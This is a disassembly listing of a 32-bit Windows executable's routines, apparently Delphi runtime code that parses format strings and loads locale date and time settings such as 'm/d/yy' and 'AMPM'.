  40506a:	0f 85 59 ff ff ff    	jne    0x404fc9
  405070:	89 c6                	mov    %eax,%esi
  405072:	ac                   	lods   %ds:(%esi),%al
  405073:	0f b6 c8             	movzbl %al,%ecx
  405076:	eb 12                	jmp    0x40508a
  405078:	80 f9 53             	cmp    $0x53,%cl
  40507b:	0f 85 48 ff ff ff    	jne    0x404fc9
  405081:	89 c6                	mov    %eax,%esi
  405083:	09 f6                	or     %esi,%esi
  405085:	74 dd                	je     0x405064
  405087:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40508a:	3b 4d e4             	cmp    -0x1c(%ebp),%ecx
  40508d:	77 01                	ja     0x405090
  40508f:	c3                   	ret
  405090:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  405093:	c3                   	ret
  405094:	80 f9 53             	cmp    $0x53,%cl
  405097:	0f 85 2c ff ff ff    	jne    0x404fc9
  40509d:	89 c6                	mov    %eax,%esi
  40509f:	57                   	push   %edi
  4050a0:	89 c7                	mov    %eax,%edi
  4050a2:	30 c0                	xor    %al,%al
  4050a4:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4050a7:	e3 05                	jecxz  0x4050ae
  4050a9:	f2 ae                	repnz scas %es:(%edi),%al
  4050ab:	75 01                	jne    0x4050ae
  4050ad:	4f                   	dec    %edi
  4050ae:	89 f9                	mov    %edi,%ecx
  4050b0:	29 f1                	sub    %esi,%ecx
  4050b2:	5f                   	pop    %edi
  4050b3:	c3                   	ret
  4050b4:	80 f9 50             	cmp    $0x50,%cl
  4050b7:	0f 85 0c ff ff ff    	jne    0x404fc9
  4050bd:	c7 45 e4 08 00 00 00 	movl   $0x8,-0x1c(%ebp)
  4050c4:	b9 10 00 00 00       	mov    $0x10,%ecx
  4050c9:	e9 37 ff ff ff       	jmp    0x405005
  4050ce:	b7 01                	mov    $0x1,%bh
  4050d0:	eb 02                	jmp    0x4050d4
  4050d2:	b7 00                	mov    $0x0,%bh
  4050d4:	89 c6                	mov    %eax,%esi
  4050d6:	b3 00                	mov    $0x0,%bl
  4050d8:	80 f9 47             	cmp    $0x47,%cl
  4050db:	74 3f                	je     0x40511c
  4050dd:	b3 01                	mov    $0x1,%bl
  4050df:	80 f9 45             	cmp    $0x45,%cl
  4050e2:	74 38                	je     0x40511c
  4050e4:	b3 02                	mov    $0x2,%bl
  4050e6:	80 f9 46             	cmp    $0x46,%cl
  4050e9:	74 12                	je     0x4050fd
  4050eb:	b3 03                	mov    $0x3,%bl
  4050ed:	80 f9 4e             	cmp    $0x4e,%cl
  4050f0:	74 0b                	je     0x4050fd
  4050f2:	80 f9 4d             	cmp    $0x4d,%cl
  4050f5:	0f 85 ce fe ff ff    	jne    0x404fc9
  4050fb:	b3 04                	mov    $0x4,%bl
  4050fd:	b8 12 00 00 00       	mov    $0x12,%eax
  405102:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  405105:	39 c2                	cmp    %eax,%edx
  405107:	76 25                	jbe    0x40512e
  405109:	ba 02 00 00 00       	mov    $0x2,%edx
  40510e:	80 f9 4d             	cmp    $0x4d,%cl
  405111:	75 1b                	jne    0x40512e
  405113:	0f b6 15 9c c4 40 00 	movzbl 0x40c49c,%edx
  40511a:	eb 12                	jmp    0x40512e
  40511c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40511f:	ba 03 00 00 00       	mov    $0x3,%edx
  405124:	83 f8 12             	cmp    $0x12,%eax
  405127:	76 05                	jbe    0x40512e
  405129:	b8 0f 00 00 00       	mov    $0xf,%eax
  40512e:	53                   	push   %ebx
  40512f:	50                   	push   %eax
  405130:	52                   	push   %edx
  405131:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405134:	89 f2                	mov    %esi,%edx
  405136:	0f b6 cf             	movzbl %bh,%ecx
  405139:	e8 f0 0b 00 00       	call   0x405d2e
  40513e:	89 c1                	mov    %eax,%ecx
  405140:	8d 75 b8             	lea    -0x48(%ebp),%esi
  405143:	c3                   	ret
  405144:	5f                   	pop    %edi
  405145:	5e                   	pop    %esi
  405146:	5b                   	pop    %ebx
  405147:	8b e5                	mov    %ebp,%esp
  405149:	5d                   	pop    %ebp
  40514a:	c2 0c 00             	ret    $0xc
  40514d:	8d 40 00             	lea    0x0(%eax),%eax
  405150:	55                   	push   %ebp
  405151:	8b ec                	mov    %esp,%ebp
  405153:	53                   	push   %ebx
  405154:	56                   	push   %esi
  405155:	57                   	push   %edi
  405156:	8b f9                	mov    %ecx,%edi
  405158:	8b f2                	mov    %edx,%esi
  40515a:	8b d8                	mov    %eax,%ebx
  40515c:	8b c6                	mov    %esi,%eax
  40515e:	e8 a1 fb ff ff       	call   0x404d04
  405163:	50                   	push   %eax
  405164:	57                   	push   %edi
  405165:	8b 45 08             	mov    0x8(%ebp),%eax
  405168:	50                   	push   %eax
  405169:	8b ce                	mov    %esi,%ecx
  40516b:	8b c3                	mov    %ebx,%eax
  40516d:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
  405172:	e8 d1 fc ff ff       	call   0x404e48
  405177:	c6 04 03 00          	movb   $0x0,(%ebx,%eax,1)
  40517b:	8b c3                	mov    %ebx,%eax
  40517d:	5f                   	pop    %edi
  40517e:	5e                   	pop    %esi
  40517f:	5b                   	pop    %ebx
  405180:	5d                   	pop    %ebp
  405181:	c2 04 00             	ret    $0x4
  405184:	55                   	push   %ebp
  405185:	8b ec                	mov    %esp,%ebp
  405187:	51                   	push   %ecx
  405188:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40518b:	91                   	xchg   %eax,%ecx
  40518c:	87 d1                	xchg   %edx,%ecx
  40518e:	e8 05 00 00 00       	call   0x405198
  405193:	5d                   	pop    %ebp
  405194:	c2 04 00             	ret    $0x4
  405197:	90                   	nop
  405198:	55                   	push   %ebp
  405199:	8b ec                	mov    %esp,%ebp
  40519b:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  4051a1:	50                   	push   %eax
  4051a2:	83 c4 fc             	add    $0xfffffffc,%esp
  4051a5:	53                   	push   %ebx
  4051a6:	56                   	push   %esi
  4051a7:	57                   	push   %edi
  4051a8:	8b f9                	mov    %ecx,%edi
  4051aa:	8b da                	mov    %edx,%ebx
  4051ac:	8b f0                	mov    %eax,%esi
  4051ae:	8b c3                	mov    %ebx,%eax
  4051b0:	e8 3f e1 ff ff       	call   0x4032f4
  4051b5:	50                   	push   %eax
  4051b6:	57                   	push   %edi
  4051b7:	8b 45 08             	mov    0x8(%ebp),%eax
  4051ba:	50                   	push   %eax
  4051bb:	8b cb                	mov    %ebx,%ecx
  4051bd:	8d 85 fe ef ff ff    	lea    -0x1002(%ebp),%eax
  4051c3:	ba 01 10 00 00       	mov    $0x1001,%edx
  4051c8:	e8 7b fc ff ff       	call   0x404e48
  4051cd:	8b d8                	mov    %eax,%ebx
  4051cf:	81 fb 01 10 00 00    	cmp    $0x1001,%ebx
  4051d5:	75 0a                	jne    0x4051e1
  4051d7:	b8 a7 ff 00 00       	mov    $0xffa7,%eax
  4051dc:	e8 f3 f9 ff ff       	call   0x404bd4
  4051e1:	8d 95 fe ef ff ff    	lea    -0x1002(%ebp),%edx
  4051e7:	8b c6                	mov    %esi,%eax
  4051e9:	8b cb                	mov    %ebx,%ecx
  4051eb:	e8 88 e0 ff ff       	call   0x403278
  4051f0:	5f                   	pop    %edi
  4051f1:	5e                   	pop    %esi
  4051f2:	5b                   	pop    %ebx
  4051f3:	8b e5                	mov    %ebp,%esp
  4051f5:	5d                   	pop    %ebp
  4051f6:	c2 04 00             	ret    $0x4
  4051f9:	8d 40 00             	lea    0x0(%eax),%eax
  4051fc:	55                   	push   %ebp
  4051fd:	8b ec                	mov    %esp,%ebp
  4051ff:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  405205:	53                   	push   %ebx
  405206:	56                   	push   %esi
  405207:	8b f1                	mov    %ecx,%esi
  405209:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40520c:	68 00 01 00 00       	push   $0x100
  405211:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  405217:	51                   	push   %ecx
  405218:	52                   	push   %edx
  405219:	50                   	push   %eax
  40521a:	e8 2d f2 ff ff       	call   0x40444c
  40521f:	85 c0                	test   %eax,%eax
  405221:	7e 12                	jle    0x405235
  405223:	8b c8                	mov    %eax,%ecx
  405225:	49                   	dec    %ecx
  405226:	8d 95 00 ff ff ff    	lea    -0x100(%ebp),%edx
  40522c:	8b c3                	mov    %ebx,%eax
  40522e:	e8 45 e0 ff ff       	call   0x403278
  405233:	eb 09                	jmp    0x40523e
  405235:	8b c3                	mov    %ebx,%eax
  405237:	8b d6                	mov    %esi,%edx
  405239:	e8 ee df ff ff       	call   0x40322c
  40523e:	5e                   	pop    %esi
  40523f:	5b                   	pop    %ebx
  405240:	8b e5                	mov    %ebp,%esp
  405242:	5d                   	pop    %ebp
  405243:	c2 04 00             	ret    $0x4
  405246:	8b c0                	mov    %eax,%eax
  405248:	53                   	push   %ebx
  405249:	56                   	push   %esi
  40524a:	57                   	push   %edi
  40524b:	51                   	push   %ecx
  40524c:	8b d9                	mov    %ecx,%ebx
  40524e:	8b f2                	mov    %edx,%esi
  405250:	8b f8                	mov    %eax,%edi
  405252:	6a 02                	push   $0x2
  405254:	8d 44 24 04          	lea    0x4(%esp),%eax
  405258:	50                   	push   %eax
  405259:	56                   	push   %esi
  40525a:	57                   	push   %edi
  40525b:	e8 ec f1 ff ff       	call   0x40444c
  405260:	85 c0                	test   %eax,%eax
  405262:	7e 05                	jle    0x405269
  405264:	8a 04 24             	mov    (%esp),%al
  405267:	eb 02                	jmp    0x40526b
  405269:	8b c3                	mov    %ebx,%eax
  40526b:	5a                   	pop    %edx
  40526c:	5f                   	pop    %edi
  40526d:	5e                   	pop    %esi
  40526e:	5b                   	pop    %ebx
  40526f:	c3                   	ret
  405270:	55                   	push   %ebp
  405271:	8b ec                	mov    %esp,%ebp
  405273:	83 c4 f0             	add    $0xfffffff0,%esp
  405276:	53                   	push   %ebx
  405277:	56                   	push   %esi
  405278:	57                   	push   %edi
  405279:	33 c0                	xor    %eax,%eax
  40527b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40527e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405281:	33 c0                	xor    %eax,%eax
  405283:	55                   	push   %ebp
  405284:	68 a6 53 40 00       	push   $0x4053a6
  405289:	64 ff 30             	push   %fs:(%eax)
  40528c:	64 89 20             	mov    %esp,%fs:(%eax)
  40528f:	e8 d8 f1 ff ff       	call   0x40446c
  405294:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405297:	bb 01 00 00 00       	mov    $0x1,%ebx
  40529c:	be bc c4 40 00       	mov    $0x40c4bc,%esi
  4052a1:	bf ec c4 40 00       	mov    $0x40c4ec,%edi
  4052a6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4052a9:	50                   	push   %eax
  4052aa:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4052ad:	8d 83 bf ff 00 00    	lea    0xffbf(%ebx),%eax
  4052b3:	e8 14 fa ff ff       	call   0x404ccc
  4052b8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4052bb:	8d 53 44             	lea    0x44(%ebx),%edx
  4052be:	4a                   	dec    %edx
  4052bf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4052c2:	e8 35 ff ff ff       	call   0x4051fc
  4052c7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4052ca:	8b c6                	mov    %esi,%eax
  4052cc:	e8 17 df ff ff       	call   0x4031e8
  4052d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4052d4:	50                   	push   %eax
  4052d5:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4052d8:	8d 83 cf ff 00 00    	lea    0xffcf(%ebx),%eax
  4052de:	e8 e9 f9 ff ff       	call   0x404ccc
  4052e3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4052e6:	8d 53 38             	lea    0x38(%ebx),%edx
  4052e9:	4a                   	dec    %edx
  4052ea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4052ed:	e8 0a ff ff ff       	call   0x4051fc
  4052f2:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4052f5:	8b c7                	mov    %edi,%eax
  4052f7:	e8 ec de ff ff       	call   0x4031e8
  4052fc:	43                   	inc    %ebx
  4052fd:	83 c7 04             	add    $0x4,%edi
  405300:	83 c6 04             	add    $0x4,%esi
  405303:	83 fb 0d             	cmp    $0xd,%ebx
  405306:	75 9e                	jne    0x4052a6
  405308:	bb 01 00 00 00       	mov    $0x1,%ebx
  40530d:	be 1c c5 40 00       	mov    $0x40c51c,%esi
  405312:	bf 38 c5 40 00       	mov    $0x40c538,%edi
  405317:	8d 43 05             	lea    0x5(%ebx),%eax
  40531a:	b9 07 00 00 00       	mov    $0x7,%ecx
  40531f:	99                   	cltd
  405320:	f7 f9                	idiv   %ecx
  405322:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405325:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405328:	50                   	push   %eax
  405329:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40532c:	8d 83 df ff 00 00    	lea    0xffdf(%ebx),%eax
  405332:	e8 95 f9 ff ff       	call   0x404ccc
  405337:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40533a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40533d:	83 c2 31             	add    $0x31,%edx
  405340:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405343:	e8 b4 fe ff ff       	call   0x4051fc
  405348:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40534b:	8b c6                	mov    %esi,%eax
  40534d:	e8 96 de ff ff       	call   0x4031e8
  405352:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405355:	50                   	push   %eax
  405356:	8d 55 f0             	lea    -0x10(%ebp),%edx
  405359:	8d 83 e6 ff 00 00    	lea    0xffe6(%ebx),%eax
  40535f:	e8 68 f9 ff ff       	call   0x404ccc
  405364:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405367:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40536a:	83 c2 2a             	add    $0x2a,%edx
  40536d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405370:	e8 87 fe ff ff       	call   0x4051fc
  405375:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405378:	8b c7                	mov    %edi,%eax
  40537a:	e8 69 de ff ff       	call   0x4031e8
  40537f:	43                   	inc    %ebx
  405380:	83 c7 04             	add    $0x4,%edi
  405383:	83 c6 04             	add    $0x4,%esi
  405386:	83 fb 08             	cmp    $0x8,%ebx
  405389:	75 8c                	jne    0x405317
  40538b:	33 c0                	xor    %eax,%eax
  40538d:	5a                   	pop    %edx
  40538e:	59                   	pop    %ecx
  40538f:	59                   	pop    %ecx
  405390:	64 89 10             	mov    %edx,%fs:(%eax)
  405393:	68 ad 53 40 00       	push   $0x4053ad
  405398:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40539b:	ba 02 00 00 00       	mov    $0x2,%edx
  4053a0:	e8 13 de ff ff       	call   0x4031b8
  4053a5:	c3                   	ret
  4053a6:	e9 51 da ff ff       	jmp    0x402dfc
  4053ab:	eb eb                	jmp    0x405398
  4053ad:	5f                   	pop    %edi
  4053ae:	5e                   	pop    %esi
  4053af:	5b                   	pop    %ebx
  4053b0:	8b e5                	mov    %ebp,%esp
  4053b2:	5d                   	pop    %ebp
  4053b3:	c3                   	ret
  4053b4:	55                   	push   %ebp
  4053b5:	8b ec                	mov    %esp,%ebp
  4053b7:	6a 00                	push   $0x0
  4053b9:	6a 00                	push   $0x0
  4053bb:	6a 00                	push   $0x0
  4053bd:	53                   	push   %ebx
  4053be:	56                   	push   %esi
  4053bf:	57                   	push   %edi
  4053c0:	33 c0                	xor    %eax,%eax
  4053c2:	55                   	push   %ebp
  4053c3:	68 fc 55 40 00       	push   $0x4055fc
  4053c8:	64 ff 30             	push   %fs:(%eax)
  4053cb:	64 89 20             	mov    %esp,%fs:(%eax)
  4053ce:	e8 99 f0 ff ff       	call   0x40446c
  4053d3:	8b d8                	mov    %eax,%ebx
  4053d5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4053d8:	50                   	push   %eax
  4053d9:	33 c9                	xor    %ecx,%ecx
  4053db:	ba 14 00 00 00       	mov    $0x14,%edx
  4053e0:	8b c3                	mov    %ebx,%eax
  4053e2:	e8 15 fe ff ff       	call   0x4051fc
  4053e7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4053ea:	b8 94 c4 40 00       	mov    $0x40c494,%eax
  4053ef:	e8 f4 dd ff ff       	call   0x4031e8
  4053f4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4053f7:	50                   	push   %eax
  4053f8:	b9 14 56 40 00       	mov    $0x405614,%ecx
  4053fd:	ba 1b 00 00 00       	mov    $0x1b,%edx
  405402:	8b c3                	mov    %ebx,%eax
  405404:	e8 f3 fd ff ff       	call   0x4051fc
  405409:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40540c:	33 d2                	xor    %edx,%edx
  40540e:	e8 a1 f8 ff ff       	call   0x404cb4
  405413:	a2 98 c4 40 00       	mov    %al,0x40c498
  405418:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40541b:	50                   	push   %eax
  40541c:	b9 14 56 40 00       	mov    $0x405614,%ecx
  405421:	ba 1c 00 00 00       	mov    $0x1c,%edx
  405426:	8b c3                	mov    %ebx,%eax
  405428:	e8 cf fd ff ff       	call   0x4051fc
  40542d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405430:	33 d2                	xor    %edx,%edx
  405432:	e8 7d f8 ff ff       	call   0x404cb4
  405437:	a2 99 c4 40 00       	mov    %al,0x40c499
  40543c:	b1 2c                	mov    $0x2c,%cl
  40543e:	ba 0f 00 00 00       	mov    $0xf,%edx
  405443:	8b c3                	mov    %ebx,%eax
  405445:	e8 fe fd ff ff       	call   0x405248
  40544a:	a2 9a c4 40 00       	mov    %al,0x40c49a
  40544f:	b1 2e                	mov    $0x2e,%cl
  405451:	ba 0e 00 00 00       	mov    $0xe,%edx
  405456:	8b c3                	mov    %ebx,%eax
  405458:	e8 eb fd ff ff       	call   0x405248
  40545d:	a2 9b c4 40 00       	mov    %al,0x40c49b
  405462:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405465:	50                   	push   %eax
  405466:	b9 14 56 40 00       	mov    $0x405614,%ecx
  40546b:	ba 19 00 00 00       	mov    $0x19,%edx
  405470:	8b c3                	mov    %ebx,%eax
  405472:	e8 85 fd ff ff       	call   0x4051fc
  405477:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40547a:	33 d2                	xor    %edx,%edx
  40547c:	e8 33 f8 ff ff       	call   0x404cb4
  405481:	a2 9c c4 40 00       	mov    %al,0x40c49c
  405486:	b1 2f                	mov    $0x2f,%cl
  405488:	ba 1d 00 00 00       	mov    $0x1d,%edx
  40548d:	8b c3                	mov    %ebx,%eax
  40548f:	e8 b4 fd ff ff       	call   0x405248
  405494:	a2 9d c4 40 00       	mov    %al,0x40c49d
  405499:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40549c:	50                   	push   %eax
  40549d:	b9 20 56 40 00       	mov    $0x405620,%ecx
  4054a2:	ba 1f 00 00 00       	mov    $0x1f,%edx
  4054a7:	8b c3                	mov    %ebx,%eax
  4054a9:	e8 4e fd ff ff       	call   0x4051fc
  4054ae:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4054b1:	b8 a0 c4 40 00       	mov    $0x40c4a0,%eax
  4054b6:	e8 2d dd ff ff       	call   0x4031e8
  4054bb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4054be:	50                   	push   %eax
  4054bf:	b9 30 56 40 00       	mov    $0x405630,%ecx
  4054c4:	ba 20 00 00 00       	mov    $0x20,%edx
  4054c9:	8b c3                	mov    %ebx,%eax
  4054cb:	e8 2c fd ff ff       	call   0x4051fc
  4054d0:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4054d3:	b8 a4 c4 40 00       	mov    $0x40c4a4,%eax
  4054d8:	e8 0b dd ff ff       	call   0x4031e8
  4054dd:	b1 3a                	mov    $0x3a,%cl
  4054df:	ba 1e 00 00 00       	mov    $0x1e,%edx
  4054e4:	8b c3                	mov    %ebx,%eax
  4054e6:	e8 5d fd ff ff       	call   0x405248
  4054eb:	a2 a8 c4 40 00       	mov    %al,0x40c4a8
  4054f0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4054f3:	50                   	push   %eax
  4054f4:	b9 48 56 40 00       	mov    $0x405648,%ecx
  4054f9:	ba 28 00 00 00       	mov    $0x28,%edx
  4054fe:	8b c3                	mov    %ebx,%eax
  405500:	e8 f7 fc ff ff       	call   0x4051fc
  405505:	8b 55 f4             	mov    -0xc(%ebp),%edx
  405508:	b8 ac c4 40 00       	mov    $0x40c4ac,%eax
  40550d:	e8 d6 dc ff ff       	call   0x4031e8
  405512:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405515:	50                   	push   %eax
  405516:	b9 54 56 40 00       	mov    $0x405654,%ecx
  40551b:	ba 29 00 00 00       	mov    $0x29,%edx
  405520:	8b c3                	mov    %ebx,%eax
  405522:	e8 d5 fc ff ff       	call   0x4051fc
  405527:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40552a:	b8 b0 c4 40 00       	mov    $0x40c4b0,%eax
  40552f:	e8 b4 dc ff ff       	call   0x4031e8
  405534:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405537:	50                   	push   %eax
  405538:	b9 14 56 40 00       	mov    $0x405614,%ecx
  40553d:	ba 25 00 00 00       	mov    $0x25,%edx
  405542:	8b c3                	mov    %ebx,%eax
  405544:	e8 b3 fc ff ff       	call   0x4051fc
  405549:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40554c:	33 d2                	xor    %edx,%edx
  40554e:	e8 61 f7 ff ff       	call   0x404cb4
  405553:	85 c0                	test   %eax,%eax
  405555:	75 0f                	jne    0x405566
  405557:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40555a:	ba 60 56 40 00       	mov    $0x405660,%edx
  40555f:	e8 c8 dc ff ff       	call   0x40322c
  405564:	eb 0d                	jmp    0x405573
  405566:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405569:	ba 6c 56 40 00       	mov    $0x40566c,%edx
  40556e:	e8 b9 dc ff ff       	call   0x40322c
  405573:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405576:	50                   	push   %eax
  405577:	b9 14 56 40 00       	mov    $0x405614,%ecx
  40557c:	ba 23 00 00 00       	mov    $0x23,%edx
  405581:	8b c3                	mov    %ebx,%eax
  405583:	e8 74 fc ff ff       	call   0x4051fc
  405588:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40558b:	33 d2                	xor    %edx,%edx
  40558d:	e8 22 f7 ff ff       	call   0x404cb4
  405592:	85 c0                	test   %eax,%eax
  405594:	75 0f                	jne    0x4055a5
  405596:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405599:	ba 78 56 40 00       	mov    $0x405678,%edx
  40559e:	e8 89 dc ff ff       	call   0x40322c
  4055a3:	eb 08                	jmp    0x4055ad
  4055a5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4055a8:	e8 eb db ff ff       	call   0x403198
  4055ad:	ff 75 fc             	push   -0x4(%ebp)
  4055b0:	68 88 56 40 00       	push   $0x405688
  4055b5:	ff 75 f8             	push   -0x8(%ebp)
  4055b8:	b8 b4 c4 40 00       	mov    $0x40c4b4,%eax
  4055bd:	ba 03 00 00 00       	mov    $0x3,%edx
  4055c2:	e8 ed dd ff ff       	call   0x4033b4
  4055c7:	ff 75 fc             	push   -0x4(%ebp)
  4055ca:	68 94 56 40 00       	push   $0x405694
  4055cf:	ff 75 f8             	push   -0x8(%ebp)
  4055d2:	b8 b8 c4 40 00       	mov    $0x40c4b8,%eax
  4055d7:	ba 03 00 00 00       	mov    $0x3,%edx
  4055dc:	e8 d3 dd ff ff       	call   0x4033b4
  4055e1:	33 c0                	xor    %eax,%eax
  4055e3:	5a                   	pop    %edx
  4055e4:	59                   	pop    %ecx
  4055e5:	59                   	pop    %ecx
  4055e6:	64 89 10             	mov    %edx,%fs:(%eax)
  4055e9:	68 03 56 40 00       	push   $0x405603
  4055ee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4055f1:	ba 03 00 00 00       	mov    $0x3,%edx
  4055f6:	e8 bd db ff ff       	call   0x4031b8
  4055fb:	c3                   	ret
  4055fc:	e9 fb d7 ff ff       	jmp    0x402dfc
  405601:	eb eb                	jmp    0x4055ee
  405603:	5f                   	pop    %edi
  405604:	5e                   	pop    %esi
  405605:	5b                   	pop    %ebx
  405606:	8b e5                	mov    %ebp,%esp
  405608:	5d                   	pop    %ebp
  405609:	c3                   	ret
  40560a:	00 00                	add    %al,(%eax)
  40560c:	ff                   	(bad)
  40560d:	ff                   	(bad)
  40560e:	ff                   	(bad)
  40560f:	ff 01                	incl   (%ecx)
  405611:	00 00                	add    %al,(%eax)
  405613:	00 30                	add    %dh,(%eax)
  405615:	00 00                	add    %al,(%eax)
  405617:	00 ff                	add    %bh,%bh
  405619:	ff                   	(bad)
  40561a:	ff                   	(bad)
  40561b:	ff 06                	incl   (%esi)
  40561d:	00 00                	add    %al,(%eax)
  40561f:	00 6d 2f             	add    %ch,0x2f(%ebp)
  405622:	64 2f                	fs das
  405624:	79 79                	jns    0x40569f
  405626:	00 00                	add    %al,(%eax)
  405628:	ff                   	(bad)
  405629:	ff                   	(bad)
  40562a:	ff                   	(bad)
  40562b:	ff 0c 00             	decl   (%eax,%eax,1)
  40562e:	00 00                	add    %al,(%eax)
  405630:	6d                   	insl   (%dx),%es:(%edi)
  405631:	6d                   	insl   (%dx),%es:(%edi)
  405632:	6d                   	insl   (%dx),%es:(%edi)
  405633:	6d                   	insl   (%dx),%es:(%edi)
  405634:	20 64 2c 20          	and    %ah,0x20(%esp,%ebp,1)
  405638:	79 79                	jns    0x4056b3
  40563a:	79 79                	jns    0x4056b5
  40563c:	00 00                	add    %al,(%eax)
  40563e:	00 00                	add    %al,(%eax)
  405640:	ff                   	(bad)
  405641:	ff                   	(bad)
  405642:	ff                   	(bad)
  405643:	ff 02                	incl   (%edx)
  405645:	00 00                	add    %al,(%eax)
  405647:	00 61 6d             	add    %ah,0x6d(%ecx)
  40564a:	00 00                	add    %al,(%eax)
  40564c:	ff                   	(bad)
  40564d:	ff                   	(bad)
  40564e:	ff                   	(bad)
  40564f:	ff 02                	incl   (%edx)
  405651:	00 00                	add    %al,(%eax)
  405653:	00 70 6d             	add    %dh,0x6d(%eax)
  405656:	00 00                	add    %al,(%eax)
  405658:	ff                   	(bad)
  405659:	ff                   	(bad)
  40565a:	ff                   	(bad)
  40565b:	ff 01                	incl   (%ecx)
  40565d:	00 00                	add    %al,(%eax)
  40565f:	00 68 00             	add    %ch,0x0(%eax)
  405662:	00 00                	add    %al,(%eax)
  405664:	ff                   	(bad)
  405665:	ff                   	(bad)
  405666:	ff                   	(bad)
  405667:	ff 02                	incl   (%edx)
  405669:	00 00                	add    %al,(%eax)
  40566b:	00 68 68             	add    %ch,0x68(%eax)
  40566e:	00 00                	add    %al,(%eax)
  405670:	ff                   	(bad)
  405671:	ff                   	(bad)
  405672:	ff                   	(bad)
  405673:	ff 05 00 00 00 20    	incl   0x20000000
  405679:	41                   	inc    %ecx
  40567a:	4d                   	dec    %ebp
  40567b:	50                   	push   %eax
  40567c:	4d                   	dec    %ebp
  40567d:	00 00                	add    %al,(%eax)
  40567f:	00 ff                	add    %bh,%bh
  405681:	ff                   	(bad)
  405682:	ff                   	(bad)
  405683:	ff 03                	incl   (%ebx)
  405685:	00 00                	add    %al,(%eax)
  405687:	00 3a                	add    %bh,(%edx)
  405689:	6d                   	insl   (%dx),%es:(%edi)
  40568a:	6d                   	insl   (%dx),%es:(%edi)
  40568b:	00 ff                	add    %bh,%bh
  40568d:	ff                   	(bad)
  40568e:	ff                   	(bad)
  40568f:	ff 06                	incl   (%esi)
  405691:	00 00                	add    %al,(%eax)
  405693:	00 3a                	add    %bh,(%edx)
  405695:	6d                   	insl   (%dx),%es:(%edi)
  405696:	6d                   	insl   (%dx),%es:(%edi)
  405697:	3a 73 73             	cmp    0x73(%ebx),%dh
  40569a:	00 00                	add    %al,(%eax)
  40569c:	e8 b3 da ff ff       	call   0x403154
  4056a1:	83 b8 00 00 00 00 00 	cmpl   $0x0,0x0(%eax)
  4056a8:	74 0f                	je     0x4056b9
  4056aa:	e8 a5 da ff ff       	call   0x403154
  4056af:	8b 80 00 00 00 00    	mov    0x0(%eax),%eax
  4056b5:	8b 40 08             	mov    0x8(%eax),%eax
  4056b8:	c3                   	ret
  4056b9:	33 c0                	xor    %eax,%eax
  4056bb:	c3                   	ret
  4056bc:	85 c0                	test   %eax,%eax
  4056be:	74 05                	je     0x4056c5
  4056c0:	2d 78 11 40 00       	sub    $0x401178,%eax
  4056c5:	c3                   	ret
  4056c6:	8b c0                	mov    %eax,%eax
  4056c8:	53                   	push   %ebx
  4056c9:	56                   	push   %esi
  4056ca:	57                   	push   %edi
  4056cb:	55                   	push   %ebp
  4056cc:	81 c4 58 fd ff ff    	add    $0xfffffd58,%esp
  4056d2:	8b ea                	mov    %edx,%ebp
  4056d4:	8b f0                	mov    %eax,%esi
  4056d6:	68 00 01 00 00       	push   $0x100
  4056db:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  4056e2:	50                   	push   %eax
  4056e3:	a1 14 c0 40 00       	mov    0x40c014,%eax
  4056e8:	50                   	push   %eax
  4056e9:	e8 66 ed ff ff       	call   0x404454
